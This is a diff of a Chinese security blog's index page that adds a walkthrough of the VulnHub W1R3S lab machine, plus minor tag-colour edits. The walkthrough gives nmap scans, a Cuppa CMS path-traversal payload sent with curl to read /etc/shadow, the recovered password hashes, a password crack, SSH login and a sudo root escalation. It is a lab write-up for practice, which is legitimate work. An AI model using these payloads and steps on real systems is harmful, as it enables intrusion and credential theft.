@@ -139,6 +139,94 @@
         
 
 <div class="post">
+    <a href="/2025/08/18/vulnhub-W1R3S/">
+        <h2 class="post-title">vulnhub-W1R3S</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/8/18
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h2 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h2><blockquote>
+<p>nmap -p- –min-rate 1000 -sT -sV -O 192.168.206.130</p>
+</blockquote>
+<p>PORT     STATE SERVICE VERSION<br>21&#x2F;tcp   open  ftp     vsftpd 2.0.8 or later<br>22&#x2F;tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)<br>80&#x2F;tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))<br>3306&#x2F;tcp open  mysql   MySQL (unauthorized)<br>MAC Address: 00:0C:29:6F:43:28 (VMware)<br>Aggressive OS guesses: Linux 3.10 - 4.11 (98%), Linux 5.1 - 5.15 (95%), Linux 3.2 - 4.14 (94%), Linux 3.13 - 4.4 (94%), Linux 4.10 (94%), Linux 4.4 (93%), Linux 3.10 (92%), Linux 3.16 - 4.6 (92%), OpenWrt 19.07 (Linux 4.14) (92%), Linux 2.6.32 - 3.13 (91%)<br>No exact OS matches for host (test conditions non-ideal).<br>Network Distance: 1 hop<br>Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</p>
+<blockquote>
+<p>nmap -p- –min-rate 1000 -sU 192.168.206.130</p>
+</blockquote>
+<p>PORT     STATE  SERVICE<br>3306&#x2F;udp closed mysql</p>
+<blockquote>
+<p>nmap -p- –min-rate 1000 –script&#x3D;vuln 192.168.206.130</p>
+</blockquote>
+<p>PORT     STATE SERVICE<br>21&#x2F;tcp   open  ftp<br>22&#x2F;tcp   open  ssh<br>80&#x2F;tcp   open  http<br>|_http-csrf: Couldn’t find any CSRF vulnerabilities.<br>|<em>http-dombased-xss: Couldn’t find any DOM based XSS.<br>| http-slowloris-check:<br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server’s resources causing Denial Of Service.<br>|<br>|     Disclosure date: 2009-09-17<br>|     References:<br>|       <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</a><br>|</em>      <a target="_blank" rel="noopener" href="http://ha.ckers.org/slowloris/">http://ha.ckers.org/slowloris/</a><br>|<em>http-stored-xss: Couldn’t find any stored XSS vulnerabilities.<br>| http-enum:<br>|</em>  &#x2F;wordpress&#x2F;wp-login.php: Wordpress login page.<br>3306&#x2F;tcp open  mysql</p>
+<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>匿名用户</p>
+<blockquote>
+<p>anonymous&#x2F;null</p>
+</blockquote>
+<p><img src="/images/vulnhub-W1R3S/1.jpg"><br>mget下载01.txt;02.txt;03.txt;worktodo.txt;employee-names.txt到本地,均无敏感信息<br><img src="/images/vulnhub-W1R3S/2.jpg"></p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>目录扫描出cms路径,安装利用失败<br>&#x2F;administrator&#x2F;installation<br><img src="/images/vulnhub-W1R3S/3.jpg"></p>
+<p>cms有文件包含exp</p>
+<blockquote>
+<p>searchsploit cuppa</p>
+</blockquote>
+<p><img src="/images/vulnhub-W1R3S/4.jpg"></p>
+<p>下载exp</p>
+<blockquote>
+<p>searchsploit cupa -m 25971.txt</p>
+</blockquote>
+<p><img src="/images/vulnhub-W1R3S/5.jpg"><br>该cms默认payload</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/shadow">http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/shadow</a></p>
+</blockquote>
+<p><img src="/images/vulnhub-W1R3S/6.jpg"><br>需要参数用post+urlencode,得出最终payload</p>
+<blockquote>
+<p>curl <a target="_blank" rel="noopener" href="http://192.168.206.130/administrator/alerts/alertConfigField.php">http://192.168.206.130/administrator/alerts/alertConfigField.php</a> –data-urlencode “urlConfig&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;shadow”</p>
+</blockquote>
+<p>回显中三个密码为</p>
+<blockquote>
+<p>root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx.&#x2F;ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ<br>data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8&#x2F;0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud<br>w1r3s:$6$xe&#x2F;eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb&#x2F;io7x9q1i</p>
+</blockquote>
+<p>解密<br>john 1.txt 解出w1r3s密码</p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><blockquote>
+<p>ssh w1r3s&#x2F;computer</p>
+</blockquote>
+<p><img src="/images/vulnhub-W1R3S/7.jpg"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>sudo -l为all<br><img src="/images/vulnhub-W1R3S/8.jpg"><br>直接提权</p>
+<blockquote>
+<p>sudo &#x2F;bin&#x2F;bash</p>
+</blockquote>
+<p><img src="/images/vulnhub-W1R3S/9.jpg"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%86%85%E7%BD%91/" style="color: #00bcd4">内网</a>
+        </span>
+        
+    </div>
+    <a href="/2025/08/18/vulnhub-W1R3S/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2025/08/12/lmxcms%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/">
         <h2 class="post-title">lmxcms审计复现</h2>
     </a>
@@ -180,7 +268,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%A1%E8%AE%A1/" style="color: #00bcd4">审计</a>
+            <a href="/tags/%E5%AE%A1%E8%AE%A1/" style="color: #00a596">审计</a>
         </span>
         
     </div>
@@ -223,7 +311,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%A1%E8%AE%A1/" style="color: #00a596">审计</a>
+            <a href="/tags/%E5%AE%A1%E8%AE%A1/" style="color: #ff7d73">审计</a>
         </span>
         
     </div>
@@ -268,7 +356,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%A1%E8%AE%A1/" style="color: #ffa2c4">审计</a>
+            <a href="/tags/%E5%AE%A1%E8%AE%A1/" style="color: #03a9f4">审计</a>
         </span>
         
     </div>
@@ -313,7 +401,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="color: #00bcd4">漏洞复现</a>
+            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="color: #03a9f4">漏洞复现</a>
         </span>
         
     </div>
@@ -358,7 +446,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="color: #00a596">漏洞复现</a>
+            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="color: #00bcd4">漏洞复现</a>
         </span>
         
     </div>
@@ -406,7 +494,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="color: #ff7d73">漏洞复现</a>
+            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="color: #ffa2c4">漏洞复现</a>
         </span>
         
     </div>
@@ -505,7 +593,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E5%B7%A5%E5%85%B7/" style="color: #00a596">工具</a>
+            <a href="/tags/%E5%B7%A5%E5%85%B7/" style="color: #ffa2c4">工具</a>
         </span>
         
     </div>
@@ -565,61 +653,6 @@
         
     </div>
     <a href="/2025/03/28/EZ%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F-%E4%BA%91%E7%AB%AF%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2025/03/28/EZ%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F-%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/">
-        <h2 class="post-title">EZ被动扫描-本地使用手册</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2025/3/28
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h2 id="1-ez安装与基础配置"><a href="#1-ez安装与基础配置" class="headerlink" title="1.ez安装与基础配置"></a>1.ez安装与基础配置</h2><p><a target="_blank" rel="noopener" href="https://github.com/m-sec-org/EZ/releases/tag/1.8.9">https://github.com/m-sec-org/EZ/releases/tag/1.8.9</a></p>
-<p>选择操作系统对应的ez-zip文件并解压</p>
-<p><img src="/images/EZ%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F-%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/1.png"></p>
-<p>下载ez证书</p>
-<p><a target="_blank" rel="noopener" href="https://msec.nsfocus.com/">https://msec.nsfocus.com/</a></p>
-<p>登录-个人中心-申请证书-证书下载</p>
-<p><img src="/images/EZ%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F-%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/2.png"></p>
-<p>将ez与ez证书放在同一个目录</p>
-<p><img src="/images/EZ%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F-%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/3.png"></p>
-<p>在该目录开启命令行，ez web端启动(如MAC命令为.&#x2F; ez的文件名 web)</p>
-<p><img src="/images/EZ%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F-%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/4.png"></p>
-<p><img src="/images/EZ%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F-%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/5.png"></p>
-<p>访问<a target="_blank" rel="noopener" href="http://127.0.0.1:8888/">http://127.0.0.1:8888</a> + &#x2F;bwheyansn(每次启动随机给出的路径)</p>
-<p><img src="/images/EZ%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F-%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/6.png"></p>
-<p>初始密码为ez，首次访问需要重置密码</p>
-<p><img src="/images/EZ%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F-%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/7.png"></p>
-<h2 id="2-ezhelper安装与基础配置"><a href="#2-ezhelper安装与基础配置" class="headerlink" title="2.ezhelper安装与基础配置"></a>2.ezhelper安装与基础配置</h2>
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%B7%A5%E5%85%B7SOP/" style="color: #ffa2c4">工具SOP</a>
-        </span>
-        
-    </div>
-    <a href="/2025/03/28/EZ%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F-%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/" class="go-post">阅读全文</a>
 </div>
 
 
